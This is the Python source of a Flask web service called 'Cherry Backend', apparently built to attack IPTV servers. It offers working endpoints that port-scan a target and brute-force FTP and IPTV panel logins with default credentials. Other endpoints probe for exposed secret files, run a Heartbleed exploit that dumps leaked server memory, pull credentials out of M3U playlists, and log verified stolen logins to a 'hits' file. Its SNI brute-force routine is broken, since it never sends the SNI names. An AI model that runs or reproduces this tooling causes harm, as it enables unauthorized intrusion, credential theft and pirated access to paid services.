#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify
from flask_cors import CORS
import socket
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
import ftplib
import re
import time
from datetime import datetime
import random
import os
import sys
import binascii
import select
import struct
from urllib.parse import urlparse, urljoin, parse_qs
from collections import deque

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# ===== CONFIGURACIÓN =====
TIMEOUT = 3
MAX_WORKERS = 20  # Reducido para Render gratis
BASE_DIR = "/tmp/cherry_data"  # Render solo permite escribir en /tmp
os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)

# ===== PUERTOS IPTV COMPLETOS =====
IPTV_PORTS = [
    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 444, 445,
    8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8443, 8444, 8445, 8446, 8447, 8448, 8449,
    8880, 8881, 8882, 8883, 8884, 8885, 8886, 8887, 8888, 8889,
    2082, 2083, 2086, 2087, 2095, 2096, 2052, 2053,
    25461, 25462, 25463, 25464, 25465, 25466, 25467, 25468, 25469, 25470,
    25500, 25501, 25502, 25503, 25504, 25505,
    1935, 1936, 1937, 1938, 1939, 1940, 554, 8554,
    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009,
    3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009,
    4000, 4001, 4002, 4003, 4004, 4005, 4006, 4007, 4008, 4009,
    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009,
    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009,
    8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009,
    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009,
    10000, 10001, 10002, 10003, 10004, 10005, 11000, 12000, 13000,
    14000, 15000, 16000, 17000, 18000, 19000, 20000, 21000, 22000,
    23000, 24000, 25000, 26000, 27000, 28000, 29000, 30000
]

# ===== ENDPOINTS IPTV =====
IPTV_ENDPOINTS = [
    '/player_api.php', '/get.php', '/panel_api.php', '/api.php',
    '/xmltv.php', '/live', '/movie', '/series',
    '/streaming/clients_live.php', '/portal.php', '/enigma2.php',
    '/playlist.m3u', '/tv.m3u', '/live.m3u8', '/index.php',
    '/admin.php', '/login.php', '/user.php', '/users.php',
    '/clients.php', '/client.php', '/api/live.php', '/api/movie.php',
    '/api/series.php', '/panel/', '/admin/', '/manager/', '/control/',
    '/server/', '/iptv/', '/stream/', '/hls/', '/dash/', '/vod/',
    '/movies/', '/series/', '/channels/', '/live/', '/livestream/',
    '/livetv/', '/tv/', '/radio/'
]

# ===== CREDENCIALES COMUNES =====
COMMON_CREDS = [
    ('admin', 'admin'), ('admin', '1234'), ('admin', 'password'),
    ('admin', '123456'), ('admin', 'admin123'), ('admin', '12345'),
    ('root', 'root'), ('root', 'toor'), ('root', '123456'),
    ('user', 'user'), ('user', '1234'), ('test', 'test'),
    ('test', '1234'), ('demo', 'demo'), ('demo', '1234'),
    ('administrator', 'administrator'), ('guest', 'guest'),
    ('support', 'support'), ('ftp', 'ftp'), ('mysql', 'mysql'),
    ('postgres', 'postgres'), ('oracle', 'oracle'), ('tomcat', 'tomcat'),
    ('manager', 'manager'), ('supervisor', 'supervisor')
]

# ===== FUNCIÓN DE GEOLOCALIZACIÓN =====
def get_ip_location(ip: str) -> dict:
    try:
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url, timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                location = ""
                if data.get('city'):
                    location += data['city'] + ", "
                if data.get('regionName'):
                    location += data['regionName'] + ", "
                if data.get('country'):
                    location += data['country']
                location = location.strip(', ')
                country_code = data.get('countryCode', '')
                flag = '🌍'
                if country_code and len(country_code) == 2:
                    try:
                        flag = ''.join(chr(ord(c.upper()) + 127397) for c in country_code)
                    except:
                        pass
                return {
                    'location': location if location else 'Ubicación desconocida',
                    'country_flag': flag,
                    'isp': data.get('isp', ''),
                    'org': data.get('org', '')
                }
    except:
        pass
    return {
        'location': 'No disponible',
        'country_flag': '🌍',
        'isp': '',
        'org': ''
    }

# ===== FUNCIÓN PARA OBTENER PROXYS GRATIS =====
def get_free_proxies():
    proxies = []
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
    ]
    for url in sources:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                for line in r.text.strip().split('\n'):
                    proxy = line.strip()
                    if ':' in proxy:
                        proxies.append(proxy)
                        if len(proxies) >= 30:
                            break
        except:
            continue
    return list(set(proxies))[:20]

# ===== FUNCIONES DE UTILIDAD =====
def get_service_name(port):
    services = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 80: 'HTTP',
        110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
        995: 'POP3S', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
        5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
        25461: 'IPTV', 25462: 'IPTV', 25463: 'IPTV', 25464: 'IPTV', 25465: 'IPTV',
        27017: 'MongoDB', 8888: 'HTTP-Proxy', 8081: 'HTTP-Alt2'
    }
    return services.get(port, f'Port-{port}')

def grab_banner(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((host, port))
        if port in [21, 25, 110, 143, 443, 993, 995, 22]:
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        elif port in [80, 443, 8080, 8443, 25461, 25462, 25463]:
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        else:
            banner = ""
        sock.close()
        return banner[:200]
    except:
        return ""

# ===== EXPLOITS REALES (de ULTIMATE_HOST) =====
def check_ftp_vulnerabilities(host, port=21):
    results = {'anonymous': False, 'creds': []}
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=3)
        ftp.login()
        results['anonymous'] = True
        try:
            files = ftp.nlst()
            results['files'] = files[:5]
        except:
            pass
        ftp.quit()
    except:
        pass
    for user, pwd in COMMON_CREDS[:5]:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=2)
            ftp.login(user, pwd)
            results['creds'].append({'username': user, 'password': pwd})
            ftp.quit()
            break
        except:
            continue
    return results

def check_http_vulnerabilities(host, port, ssl=False):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}"
    results = {'admin_panels': [], 'm3u_files': [], 'sensitive_files': [], 'creds': []}
    paths = {
        'admin': ['/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager'],
        'm3u': ['/playlist.m3u', '/tv.m3u', '/live.m3u', '/get.php', '/player_api.php'],
        'sensitive': ['/phpinfo.php', '/.env', '/config.php', '/backup.sql', '/info.php']
    }
    for category, path_list in paths.items():
        for path in path_list:
            try:
                url = base_url + path
                r = requests.get(url, timeout=2, verify=False)
                if r.status_code == 200:
                    if category == 'admin':
                        results['admin_panels'].append(url)
                    elif category == 'm3u' and ('#EXTM3U' in r.text or '.m3u' in url):
                        results['m3u_files'].append(url)
                    elif category == 'sensitive':
                        results['sensitive_files'].append(url)
            except:
                continue
    return results

def check_iptv_vulnerabilities(host, port):
    protocol = 'https' if port in [443, 8443, 25462, 25464] else 'http'
    base_url = f"{protocol}://{host}:{port}"
    results = {'creds': [], 'm3u_urls': []}
    for endpoint in IPTV_ENDPOINTS[:10]:
        for user, pwd in COMMON_CREDS[:10]:
            try:
                if 'player_api' in endpoint or 'api.php' in endpoint:
                    url = f"{base_url}{endpoint}?username={user}&password={pwd}"
                elif 'get.php' in endpoint:
                    url = f"{base_url}{endpoint}?username={user}&password={pwd}&type=m3u_plus"
                else:
                    continue
                r = requests.get(url, timeout=2, verify=False)
                if r.status_code == 200:
                    if 'player_api' in endpoint:
                        try:
                            data = r.json()
                            if data.get('user_info', {}).get('auth') == 1:
                                results['creds'].append({'username': user, 'password': pwd})
                        except:
                            pass
                    elif '#EXTM3U' in r.text:
                        results['m3u_urls'].append(url)
                        results['creds'].append({'username': user, 'password': pwd})
            except:
                continue
    return results

# ===== HEARTBLEED EXPLOIT (de ULTIMATE_HOST) =====
hello = bytes.fromhex('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
'''.replace('\n', '').replace(' ', ''))

hb = bytes.fromhex('''
18 03 02 00 03
01 40 00
'''.replace('\n', '').replace(' ', ''))

def receive_all(s, length, timeout=5):
    end_time = time.time() + timeout
    data = b''
    remaining = length
    while remaining > 0:
        if time.time() > end_time:
            return None
        r, w, e = select.select([s], [], [], 0.5)
        if s in r:
            try:
                chunk = s.recv(remaining)
                if not chunk:
                    return None
                data += chunk
                remaining -= len(chunk)
            except:
                return None
        else:
            continue
    return data

def receive_message(s):
    header = receive_all(s, 5)
    if header is None:
        return None, None, None
    msg_type, version, length = struct.unpack('>BHH', header)
    payload = receive_all(s, length, 10)
    if payload is None:
        return None, None, None
    return msg_type, version, payload

def hexdump(data):
    result = []
    for i in range(0, min(len(data), 256), 16):
        s = data[i:i+16]
        hexa = ' '.join(f'{b:02x}' for b in s)
        text = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in s)
        result.append(f'{i:04x}: {hexa:<48} {text}')
    return '\n'.join(result)

def check_heartbleed(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.send(hello)
        
        server_version = None
        while True:
            msg_type, version, payload = receive_message(s)
            if msg_type is None:
                break
            if msg_type == 22 and payload and payload[0] == 0x0E:
                server_version = version
                break
            if msg_type == 21:
                break
        
        if server_version is None:
            s.close()
            return False
        
        s.send(hb)
        msg_type, version, payload = receive_message(s)
        s.close()
        
        if msg_type == 24 and payload and len(payload) > 3:
            return {
                'vulnerable': True,
                'data_size': len(payload),
                'data_hex': hexdump(payload)[:500]
            }
        return {'vulnerable': False}
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}

# ===== SNI BRUTE FORCE =====
def sni_bruteforce(host, port=443, sni_list=None):
    if sni_list is None:
        sni_list = [
            "iptv.live", "panel.tv", "xui.com", "live-stream.net",
            "access.iptv", "client.xui", "userpanel.pro", "tvserver.world",
            "xtream-codes.com", "iptv-provider.com", "streaming-server.com"
        ]
    
    results = []
    for sni in sni_list[:5]:  # Limitar a 5 SNIs
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Construir ClientHello con SNI (simplificado)
            client_hello = hello  # Usar el mismo hello de heartbleed
            sock.send(client_hello)
            
            readable, _, _ = select.select([sock], [], [], 2)
            if readable:
                response = sock.recv(4096)
                if response and response[0] == 0x16:
                    results.append({
                        'sni': sni,
                        'success': True,
                        'response': 'TLS response'
                    })
                else:
                    results.append({'sni': sni, 'success': False})
            else:
                results.append({'sni': sni, 'success': False, 'error': 'timeout'})
            sock.close()
        except Exception as e:
            results.append({'sni': sni, 'success': False, 'error': str(e)})
    
    return results

# ===== M3U PROCESSING =====
def extract_from_m3u(url):
    try:
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            return {'success': False, 'error': f'HTTP {r.status_code}'}
        
        content = r.text
        credentials = []
        
        # Buscar credenciales en la URL
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            username = params.get('username', [''])[0] or params.get('user', [''])[0]
            password = params.get('password', [''])[0] or params.get('pass', [''])[0]
            if username and password:
                credentials.append({'username': username, 'password': password})
        
        # Buscar en el contenido M3U
        lines = content.split('\n')
        for line in lines:
            if line.startswith('#EXTINF'):
                # Buscar group-title
                group_match = re.search(r'group-title="([^"]+)"', line)
                if group_match:
                    pass  # Podríamos guardar categorías
            elif line and not line.startswith('#') and ('http://' in line or 'https://' in line):
                # Es una URL de stream, podría contener credenciales
                stream_url = line.strip()
                stream_parsed = urlparse(stream_url)
                if stream_parsed.query:
                    params = parse_qs(stream_parsed.query)
                    username = params.get('username', [''])[0] or params.get('user', [''])[0]
                    password = params.get('password', [''])[0] or params.get('pass', [''])[0]
                    if username and password:
                        credentials.append({'username': username, 'password': password})
        
        return {
            'success': True,
            'server_url': f"{parsed.scheme}://{parsed.netloc}",
            'server_ip': socket.gethostbyname(parsed.hostname),
            'credentials': list({(c['username'], c['password']): c for c in credentials}.values()),
            'streams_count': len([l for l in lines if l and not l.startswith('#')])
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== VERIFY CREDENTIALS =====
def verify_credentials(host, port, username, password):
    try:
        # Probar HTTP primero
        for proto in ['http', 'https']:
            url = f"{proto}://{host}:{port}/player_api.php?username={username}&password={password}&action=user_info"
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get('user_info', {}).get('auth') == 1:
                        user_info = data.get('user_info', {})
                        exp_date = user_info.get('exp_date', '')
                        created_at = user_info.get('created_at', '')
                        
                        # Guardar hit en archivo
                        hit_file = f"{BASE_DIR}/hits/hits.txt"
                        with open(hit_file, 'a') as f:
                            f.write(f"{host}:{port}|{username}|{password}|{exp_date}|{created_at}\n")
                        
                        return {
                            'success': True,
                            'hit': {
                                'host': host,
                                'port': port,
                                'username': username,
                                'password': password,
                                'exp_date': exp_date,
                                'created_at': created_at,
                                'active_cons': user_info.get('active_cons', 0),
                                'max_connections': user_info.get('max_connections', 0)
                            }
                        }
                except:
                    pass
        return {'success': False}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== FIND MIRRORS =====
def find_mirrors(host):
    mirrors = []
    try:
        # Resolver IP del host
        ip = socket.gethostbyname(host)
        
        # Escanear puertos comunes en la misma IP
        common_ports = [80, 443, 8080, 8443, 8888, 25461, 25462]
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, port)) == 0:
                service = get_service_name(port)
                mirrors.append({'host': ip, 'port': port, 'service': service})
            sock.close()
        
        # Buscar subdominios comunes
        subdomains = ['www', 'cpanel', 'panel', 'admin', 'server', 'ns1', 'ns2']
        for sub in subdomains:
            try:
                sub_ip = socket.gethostbyname(f"{sub}.{host}")
                if sub_ip != ip:
                    mirrors.append({'host': f"{sub}.{host}", 'ip': sub_ip, 'port': 80, 'service': 'HTTP'})
            except:
                pass
        
        return {'success': True, 'mirrors': mirrors[:10]}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== ESCANEO PRINCIPAL =====
def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((host, port))
        
        if result == 0:
            service = get_service_name(port)
            banner = grab_banner(host, port)
            vulnerabilities = []
            
            if port == 21:
                ftp_res = check_ftp_vulnerabilities(host, port)
                if ftp_res.get('anonymous'):
                    vulnerabilities.append({'type': 'ftp_anonymous', 'risk': 'high'})
                if ftp_res.get('creds'):
                    vulnerabilities.append({'type': 'ftp_weak_creds', 'creds': ftp_res['creds'], 'risk': 'critical'})
            
            elif port in [80, 443, 8080, 8443, 25461, 25462, 25463]:
                http_res = check_http_vulnerabilities(host, port, ssl=(port in [443,8443,25462]))
                if http_res.get('admin_panels'):
                    vulnerabilities.append({'type': 'admin_panel', 'urls': http_res['admin_panels'], 'risk': 'medium'})
                if http_res.get('m3u_files'):
                    vulnerabilities.append({'type': 'm3u_exposed', 'urls': http_res['m3u_files'], 'risk': 'high'})
                if http_res.get('sensitive_files'):
                    vulnerabilities.append({'type': 'sensitive_exposed', 'urls': http_res['sensitive_files'], 'risk': 'critical'})
                
                iptv_res = check_iptv_vulnerabilities(host, port)
                if iptv_res.get('creds'):
                    vulnerabilities.append({'type': 'iptv_creds', 'creds': iptv_res['creds'], 'risk': 'critical'})
                if iptv_res.get('m3u_urls'):
                    vulnerabilities.append({'type': 'iptv_m3u', 'urls': iptv_res['m3u_urls'], 'risk': 'high'})
            
            sock.close()
            
            return {
                'port': port,
                'open': True,
                'service': service,
                'banner': banner,
                'vulnerabilities': vulnerabilities,
                'vulnerable': len(vulnerabilities) > 0
            }
        sock.close()
        return {'port': port, 'open': False}
    except Exception as e:
        return {'port': port, 'open': False, 'error': str(e)}

# ===== RUTAS API =====
@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'version': '5.0 - COMPLETE EDITION',
        'ports_available': len(IPTV_PORTS),
        'message': '🔥 CHERRY BACKEND CON TODOS LOS EXPLOITS'
    })

@app.route('/api/scan', methods=['POST'])
def scan():
    data = request.json
    host = data.get('host', '').strip()
    ports_str = data.get('ports', '').strip()
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    host = host.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    
    port_list = []
    if ports_str:
        for p in ports_str.split(','):
            try:
                port_list.append(int(p.strip()))
            except:
                pass
        if len(port_list) > 30:
            port_list = port_list[:30]
    else:
        port_list = IPTV_PORTS[:30]
    
    results = []
    batch_size = 5
    for i in range(0, len(port_list), batch_size):
        batch = port_list[i:i+batch_size]
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(batch))) as executor:
            futures = {executor.submit(scan_port, host, p): p for p in batch}
            for future in futures:
                try:
                    results.append(future.result(timeout=TIMEOUT+2))
                except:
                    results.append({'port': futures[future], 'open': False})
    
    open_ports = [r for r in results if r.get('open')]
    vulnerable = [r for r in results if r.get('vulnerable')]
    location = get_ip_location(host)
    
    return jsonify({
        'host': host,
        'location': location,
        'results': results,
        'open_ports': open_ports,
        'vulnerable_ports': vulnerable,
        'open': len(open_ports),
        'vulnerable': len(vulnerable),
        'total': len(results),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/deep-analyze', methods=['POST'])
def deep_analyze():
    data = request.json
    host = data.get('host')
    port = data.get('port')
    
    if not host or not port:
        return jsonify({'error': 'Host y puerto requeridos'}), 400
    
    result = scan_port(host, int(port))
    
    return jsonify({
        'success': True,
        'results': result
    })

@app.route('/api/scan-quick', methods=['POST'])
def scan_quick():
    data = request.json
    host = data.get('host', '').strip()
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    host = host.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    critical_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 25463, 8081]
    
    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in critical_ports}
        for future in futures:
            try:
                result = future.result(timeout=3)
                results.append(result)
            except:
                pass
    
    return jsonify({
        'host': host,
        'results': results,
        'open_ports': [r for r in results if r.get('open')]
    })

@app.route('/api/exploit/heartbleed', methods=['POST'])
def exploit_heartbleed():
    data = request.json
    host = data.get('host')
    port = data.get('port', 443)
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = check_heartbleed(host, int(port))
    return jsonify(result)

@app.route('/api/m3u/process', methods=['POST'])
def m3u_process():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({'error': 'URL requerida'}), 400
    
    result = extract_from_m3u(url)
    return jsonify(result)

@app.route('/api/sni-test', methods=['POST'])
def sni_test():
    data = request.json
    host = data.get('host')
    port = data.get('port', 443)
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = sni_bruteforce(host, int(port))
    return jsonify({'success': True, 'results': result})

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    host = data.get('host')
    username = data.get('username')
    password = data.get('password')
    port = data.get('port', 80)
    
    if not host or not username or not password:
        return jsonify({'error': 'Host, usuario y contraseña requeridos'}), 400
    
    result = verify_credentials(host, int(port), username, password)
    return jsonify(result)

@app.route('/api/m3u/server', methods=['POST'])
def m3u_server():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({'error': 'URL requerida'}), 400
    
    # Similar a m3u_process pero con más detalles
    result = extract_from_m3u(url)
    return jsonify(result)

@app.route('/api/mirrors', methods=['GET'])
def mirrors():
    host = request.args.get('host')
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = find_mirrors(host)
    return jsonify(result)

@app.route('/api/proxies', methods=['GET'])
def get_proxies():
    proxies = get_free_proxies()
    return jsonify({
        'proxies': proxies,
        'count': len(proxies),
        'source': 'public_lists'
    })

@app.route('/api/clear', methods=['POST'])
def clear():
    try:
        os.system(f"rm -rf {BASE_DIR}/*")
        os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)
        return jsonify({'success': True, 'message': 'Cache cleared'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🍒 CHERRY BACKEND - COMPLETE EDITION")
    print("="*70)
    print(f"📋 Puertos configurados: {len(IPTV_PORTS)}")
    print(f"🔧 Heartbleed: ACTIVADO")
    print(f"📁 M3U Processing: ACTIVADO")
    print(f"🔍 SNI Brute-force: ACTIVADO")
    print(f"🎯 Mirrors: ACTIVADO")
    print(f"📂 Datos en: {BASE_DIR}")
    print("="*70 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)